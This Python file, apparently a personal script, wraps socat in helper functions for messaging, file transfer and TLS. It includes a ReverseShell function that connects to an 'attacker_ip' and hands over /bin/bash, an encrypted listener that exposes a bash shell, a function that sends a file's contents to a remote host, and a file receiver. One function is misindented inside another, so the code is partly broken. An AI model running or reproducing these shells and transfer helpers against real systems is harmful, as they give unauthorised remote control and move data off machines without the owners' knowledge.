import subprocess
import time

def sending (msg, ip, port):
   response = subprocess.Popen(
      ['socat', '-', f'TCP4:{ip}:{port}'],
      text=True,
      stdin=subprocess.PIPE,
      stdout=subprocess.PIPE,
   )
   response.stdin.write(msg + '\n')
   response.stdin.flush()

   output = response.stdout.readline()
   response.terminate()

   return output.strip()

def listening (port):
   response = subprocess.Popen(
      ['socat', f'TCP4-LISTEN:{port}', 'exec:/bin/cat'],
      text=True,
      stdin=subprocess.PIPE,
      stdout=subprocess.PIPE,
   )
   return response

server = listening(4444)
time.sleep(1)  # انتظر السيرفر يشتغل

result = sending("Hello Server", "127.0.0.1", 4444)
print("Result:", result)

server.terminate()


def SenFile(file, ip, port):
   with open(file, 'r') as f:
      content = f.read()
      response = subprocess.Popen(
      ['socat', '-', f'TCP4:{ip}:{port}' ],
      text=True,
      stdin=subprocess.PIPE,
      stdout=subprocess.PIPE,
   )
   response.stdin.write(content + '\n')
   response.stdin.flush()

   output = response.stdout.readline()
   response.terminate()
   
   return output.strip()


   def ReverseShell(attacker_ip, attacker_port):
    response = subprocess.Popen(
        ['socat', f'TCP4:{attacker_ip}:{attacker_port}', 'exec:/bin/bash,-echo=0'],
        text=True,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
    )
    return response

def EncryptedSend(msg, ip, port):
    response = subprocess.Popen(
        ['socat', '-', f'OPENSSL:{ip}:{port},verify=0'],
        text=True,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
    )
    response.stdin.write(msg + '\n')
    response.stdin.flush()
    
    output = response.stdout.readline()
    response.terminate()
    
    return output.strip()

def EncryptedListen(port):
    response = subprocess.Popen(
        ['socat', f'OPENSSL-LISTEN:{port},cert=/path/to/cert.pem,reuseaddr,fork', 'exec:/bin/bash'],
        text=True,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
    )
    return response

def ReceiveFile(port, save_path):
    response = subprocess.Popen(
        ['socat', f'TCP4-LISTEN:{port}', f'file:{save_path}'],
        text=True,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
    )
    return response